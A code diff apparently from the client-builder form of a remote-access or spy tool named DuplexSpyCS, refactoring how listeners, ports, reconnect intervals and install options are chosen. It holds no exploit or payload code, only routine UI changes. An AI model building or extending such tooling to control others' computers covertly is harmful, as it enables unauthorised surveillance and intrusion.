@@ -59,13 +59,13 @@ namespace DuplexSpyCS
         private const int SHCNE_ASSOCCHANGED = 0x08000000;
         private const int SHCNF_IDLIST = 0x0000;
 
-        private List<stListenerConfig> m_lsListener { get; init; }
+        private List<stListenerConfig> m_lsConfig = new List<stListenerConfig>();
 
         public frmBuild()
         {
             InitializeComponent();
 
-            m_lsListener = clsStore.sql_conn.fnlsGetAllListener();
+            m_lsConfig.AddRange(clsStore.sql_conn.fnlsGetAllListener());
         }
 
         /// <summary>
@@ -304,8 +304,8 @@ namespace DuplexSpyCS
         {
             tabControl1.SelectedIndex = tabControl1.TabPages.Count - 1; //Select Last Page
 
-            int nListener = comboBox3.SelectedIndex;
-            var listener = m_lsListener[nListener];
+            string szName = comboBox3.Text;
+            var listener = clsStore.sql_conn.fnGetListener(szName);
 
             buildConfig = new BuildConfig()
             {
@@ -316,7 +316,7 @@ namespace DuplexSpyCS
                 dwRetry = (int)numericUpDown3.Value, //Client reconnect time interval(ms).
                 dwInterval = (int)numericUpDown4.Value, //Send inform interval(ms).
                 szPrefix = textBox2.Text,
-                enProtocol = (enListenerProtocol)Enum.Parse(typeof(enListenerProtocol), comboBox3.Text),
+                enProtocol = listener.enProtocol,
 
                 //Install
                 bCopyDir = checkBox1.Checked,
@@ -459,10 +459,21 @@ namespace DuplexSpyCS
 
         private void fnSetup()
         {
-            foreach (var listener in m_lsListener)
+            comboBox2.DropDownStyle = ComboBoxStyle.DropDownList;
+
+            //Remove this if implant is implemented.
+            groupBox3.Hide();
+
+            foreach (var listener in m_lsConfig)
                 comboBox3.Items.Add(listener.szName);
 
-            comboBox3.SelectedIndex = 0;
+            if (comboBox3.Items.Count == 0)
+                MessageBox.Show("Cannot find any listener, please create a new one!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            else
+            {
+                comboBox3.SelectedIndex = 0;
+            }
+
             comboBox3.DropDownStyle = ComboBoxStyle.DropDownList;
 
             try
@@ -489,7 +500,6 @@ namespace DuplexSpyCS
                     int dwInterval = int.Parse(ReadIni("Build", "interval")); //ms
 
                     textBox1.Text = szIP; //Server IP address.
-                    numericUpDown1.Value = dwPort; //Server listening port.
 
                     numericUpDown2.Value = dwTimeout; //Client connection timeout(ms).
                     numericUpDown3.Value = dwRetry;  //Client retry interval(ms).
@@ -637,8 +647,16 @@ namespace DuplexSpyCS
 
         private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
         {
-            var listener = m_lsListener[comboBox3.SelectedIndex];
+            if (m_lsConfig.Count == 0)
+                return;
+
+            var listener = m_lsConfig[comboBox3.SelectedIndex];
             numericUpDown1.Value = listener.nPort;
+        }
+
+        private void groupBox3_Enter(object sender, EventArgs e)
+        {
+
         }
     }
 }
